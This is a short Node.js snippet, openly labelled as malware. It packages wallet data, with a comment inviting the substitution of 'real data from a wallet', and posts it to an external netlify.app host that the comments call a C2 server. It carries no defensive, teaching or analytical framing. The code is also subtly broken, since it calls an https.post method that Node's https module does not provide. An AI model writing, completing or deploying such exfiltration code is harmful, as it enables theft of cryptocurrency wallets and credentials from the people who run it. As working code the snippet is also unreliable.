const https = require('https');

// Example wallet data (you can replace this with real data from a wallet)
const data = {
  wallet: "0x1234567890abcdef1234567890abcdef12",
  timestamp: Date.now()
};

// Send data to your C2 server
https.post(`https://tubular-empanada-751582.netlify.app/data`, {
  headers: {
    'Content-Type': 'application/json'
  },
  body: JSON.stringify(data)
}, (res) => {
  console.log('Data sent to C2 server');
});
